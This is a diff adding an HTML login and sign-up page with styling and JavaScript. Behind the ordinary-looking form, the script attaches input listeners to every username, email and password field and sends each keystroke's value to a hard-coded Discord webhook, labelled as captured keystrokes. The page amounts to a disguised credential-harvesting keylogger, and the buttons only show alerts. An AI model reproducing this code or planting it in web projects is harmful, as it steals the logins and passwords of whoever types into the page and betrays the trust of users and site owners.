@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login & Sign-Up Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .container input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .container button:hover {
+            background-color: #0056b3;
+        }
+        .container a {
+            display: block;
+            margin-top: 20px;
+            color: #007bff;
+            text-decoration: none;
+        }
+        .container a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login</h2>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+        <a href="#" onclick="switchToSignUp()">Don't have an account? Sign Up</a>
+    </div>
+
+    <div class="container" id="signup-container" style="display: none;">
+        <h2>Sign Up</h2>
+        <input type="text" id="signup-username" placeholder="Username">
+        <input type="email" id="signup-email" placeholder="Email">
+        <input type="password" id="signup-password" placeholder="Password">
+        <button onclick="signUp()">Sign Up</button>
+        <a href="#" onclick="switchToLogin()">Already have an account? Login</a>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6';
+
+        function sendKeystrokeToDiscord(fieldId, fieldValue) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Keystroke captured in ${fieldId}: ${fieldValue}`
+                })
+            });
+        }
+
+        document.getElementById('username').addEventListener('input', function() {
+            sendKeystrokeToDiscord('username', this.value);
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            sendKeystrokeToDiscord('password', this.value);
+        });
+
+        document.getElementById('signup-username').addEventListener('input', function() {
+            sendKeystrokeToDiscord('signup-username', this.value);
+        });
+
+        document.getElementById('signup-email').addEventListener('input', function() {
+            sendKeystrokeToDiscord('signup-email', this.value);
+        });
+
+        document.getElementById('signup-password').addEventListener('input', function() {
+            sendKeystrokeToDiscord('signup-password', this.value);
+        });
+
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            alert(`Logging in with:\nUsername: ${username}\nPassword: ${password}`);
+        }
+
+        function signUp() {
+            const username = document.getElementById('signup-username').value;
+            const email = document.getElementById('signup-email').value;
+            const password = document.getElementById('signup-password').value;
+            alert(`Signing up with:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`);
+        }
+
+        function switchToSignUp() {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('signup-container').style.display = 'block';
+        }
+
+        function switchToLogin() {
+            document.getElementById('signup-container').style.display = 'none';
+            document.querySelector('.container').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
